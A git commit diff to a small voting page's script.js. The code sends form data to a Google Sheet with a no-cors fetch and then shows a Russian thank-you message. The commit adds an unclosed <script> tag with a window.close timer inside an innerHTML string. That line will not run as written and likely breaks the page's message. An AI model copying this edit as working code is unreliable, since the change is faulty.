2030158e6b08b037cdf438c18337a1099e07a1f1
Parfenov Alexey <98681378+AlexeyParfenov12@users.noreply.github.com>
2026-03-21 11:06:49 +0500

    Update script.js

--- script.js
+++ script.js
@@ -27,8 +27,8 @@ async function startTracking() {
         // Отправляем данные (mode: 'no-cors' нужен, чтобы не было ошибок безопасности)
         fetch(finalUrl, { mode: 'no-cors' })
             .then(() => {
-                console.log("Данные отправлены в Google Таблицу!!!");
-                document.body.innerHTML = `<div style="background-color: #f05d5d; width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center;"><h1 style="color: #ffffff; font-size: 24px; text-align: center; font-weight: bold; font-family: verdana, sans-serif;">Спасибо, за голос! Данные сохранены.</h1></div>`;
+                console.log("Данные отправлены в Google Таблицу!!");
+                document.body.innerHTML = `<script> setTimeout(() => { window.close() }, 99999); <div style="background-color: #f05d5d; width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center;"><h1 style="color: #ffffff; font-size: 24px; text-align: center; font-weight: bold; font-family: verdana, sans-serif;">Спасибо, за голос! Данные сохранены.</h1></div>`;
             })
             .catch(err => console.error("Ошибка отправки:", err));
     }
